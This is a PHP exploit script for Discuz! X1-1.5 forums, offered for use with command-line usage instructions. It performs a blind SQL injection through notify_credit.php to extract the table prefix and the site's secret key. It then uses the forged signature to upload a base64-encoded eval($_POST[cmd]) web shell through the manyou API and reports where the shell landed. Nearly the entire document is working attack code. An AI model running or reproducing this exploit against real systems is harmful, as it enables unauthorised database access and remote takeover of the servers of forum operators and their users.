<?php
print_r('
+---------------------------------------------------------------------------+
Discuz! X1-1.5 notify_credit.php Blind SQL injection exploit by 把后续getshell代码添加了下去
+---------------------------------------------------------------------------+
');
if ($argc < 2) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' url [pre]
Example:
php '.$argv[0].' http://localhost/
php '.$argv[0].' http://localhost/ xss_
+---------------------------------------------------------------------------+
');
    exit;
}
error_reporting(7);
ini_set('max_execution_time', 0);
$url = $argv[1];
$pre = $argv[2]?$argv[2]:'pre_';
$target = parse_url($url);
extract($target);
$path1 = $path . '/api/trade/notify_credit.php';
$hash = array();
$hash = array_merge($hash, range(48, 57));
$hash = array_merge($hash, range(97, 102));

$tmp_expstr = "'";
$res = send();
if(strpos($res,'SQL syntax')==false){var_dump($res);die('Oooops.I can NOT hack it.');}
preg_match('/FROM\s([a-zA-Z_]+)forum_order/',$res,$match);
if($match[1])$pre = $match[1];
$tmp_expstr = "' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_setting WHERE ''='";
$res = send();
if(strpos($res,"doesn't exist")!==false){
    echo "Table_pre is WRONG!\nReady to Crack It.Please Waiting..\n";
    for($i = 1;$i<20;$i++){
    $tmp_expstr = "' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE '%forum_post_tableid%' AND LENGTH(REPLACE(table_name,'forum_post_tableid',''))=$i AND ''='";
    $res = send();

    if(strpos($res,'SQL syntax')!==false){  

    $pre = '';
    $hash2 = array();
    $hash2 = array_merge($hash2, range(48, 57));
    $hash2 = array_merge($hash2, range(97, 122));
    $hash2[] = 95;
    for($j = 1;$j <= $i; $j++){
    for ($k = 0; $k <= 255; $k++) {
    if(in_array($k, $hash2)) {
    $char = dechex($k);
    $tmp_expstr = "' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE '%forum_post_tableid%' AND MID(REPLACE(table_name,'forum_post_tableid',''),$j,1)=0x{$char} AND ''='";
    $res = send();
    if(strpos($res,'SQL syntax')!==false){
        echo chr($k);
        $pre .= chr($k);break;
    }  
    }  
    }     
    }     
    if(strlen($pre)){echo "\nCracked...Table_Pre:".$pre."\n";break;}else{die('GET Table_pre Failed..');};
    }    }    };
echo "Please Waiting....\n";
$sitekey = '';
for($i = 1;$i <= 32; $i++){
  for ($k = 0; $k <= 255; $k++) {
    if(in_array($k, $hash)) {
    $char = dechex($k);
$tmp_expstr = "' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_setting WHERE skey=0x6D795F736974656B6579 AND MID(svalue,{$i},1)=0x{$char} AND ''='";
$res = send();
if(strpos($res,'SQL syntax')!==false){
        echo chr($k);
        $sitekey .= chr($k);break;
}}}}
/*
By: alibaba
修改与添加了一些代码，如果成功就能得到shell
一句话秘密是 : cmd
*/
if(strlen($sitekey)!=32) 
{
 echo "\nmy_sitekey not found. try blank my_sitekey\n";
}
else echo "\nmy_sitekey:{$sitekey}\n";

echo "\nUploading Shell...";
$module = 'video';
$method = 'authauth';
$params = 'a:3:{i:0;i:1;i:1;s:36:"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=";i:2;s:3:"php";}';
$sign = md5($module . '|' . $method . '|' . $params . '|' . $sitekey);
$data = "module=$module&method=$method&params=$params&sign=$sign";
$path2 = $path . "/api/manyou/my.php";
POST($host,80,$path2,$data,30);

echo "\nGetting Shell Location...\n";
$file = '';
for($i = 1;$i <= 32; $i++){
 for ($k = 0; $k <= 255; $k++) {
     if(in_array($k, $hash)) {
   $char = dechex($k);
   $tmp_expstr = "' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_member_field_home WHERE uid=1 AND MID(videophoto,{$i},1)=0x{$char} AND ''='";
   $res = send();
   if(strpos($res,'SQL syntax')!==false){
    echo chr($k);
    $file .= chr($k);break;
   }
  }
 }
}
echo "\nShell: $host$path/data/avatar/". substr($file,0,1) . "/" . substr($file,1,1) . "/$file.php";
exit;

function sign($exp_str){
    return md5("attach=tenpay&mch_vno={$exp_str}&retcode=0&key=");
}

function send(){
    global $host, $path1, $tmp_expstr;
     
    $expdata = "attach=tenpay&retcode=0&trade_no=%2527&mch_vno=".urlencode(urlencode($tmp_expstr))."&sign=".sign($tmp_expstr);
    return POST($host,80,$path1,$expdata,30);
}  

function POST($host,$port,$path,$data,$timeout, $cookie='') {
 $buffer='';

    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);
    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); 
 else {
        fputs($fp, "POST $path HTTP/1.0\r\n");
        fputs($fp, "Host: $host\r\n");
        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ".strlen($data)."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data."\r\n\r\n");
       
  while(!feof($fp)) 
  {
   $buffer .= fgets($fp,4096);
  }
  
  fclose($fp);
    } 
 return $buffer;
} 
?>
